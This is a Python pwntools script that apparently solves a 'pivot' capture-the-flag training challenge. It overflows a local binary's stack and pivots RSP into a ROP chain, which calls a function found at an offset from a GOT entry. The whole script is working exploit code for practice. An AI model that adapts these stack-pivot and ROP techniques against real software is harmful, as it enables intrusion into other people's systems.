#!/usr/bin/python3

# This time I was too lazy to not use pwnlib :p
from pwn import * 
from ctypes import *
import sys

POP_RBP = 0x4007c8
POP_RAX = 0x4009bb
XCHG_RAX_RSP = 0x4009bd
ADD_RAX_RBP = 0x4009c4
MOV_RAX_PTR_RAX = 0x4009c0
CALL_RAX = 0x4006b0

PLT_FOOTHOLD=0x400720
GOT_PLT_FOOTHOLD=0x601040

OFFSET_FUNC=0x117

proc = process('./pivot')

proc.recvuntil(b'The Old Gods kindly bestow upon you a place to pivot: ')
rsp_dat = proc.recvuntil(b'\n')[2:-1]
new_rsp = int(rsp_dat.decode('ascii'), 16)

# Stack to pivot into later (size 0x100 = 256b = 32 vals)
packet = p64(PLT_FOOTHOLD)

packet += p64(POP_RAX)
packet += p64(GOT_PLT_FOOTHOLD)

packet += p64(POP_RBP)
packet += p64(OFFSET_FUNC)

packet += p64(MOV_RAX_PTR_RAX)
packet += p64(ADD_RAX_RBP)

packet += p64(CALL_RAX)

packet += p8(0) * (0x100 - len(packet)) # padding
proc.send(packet)

# Stack smashing stack (size 0x40, 3 vals) 
packet = p8(0) * 40

packet += p64(POP_RAX)
packet += p64(new_rsp)
packet += p64(XCHG_RAX_RSP)
proc.send(packet)

print(proc.recvall().decode('ascii'))
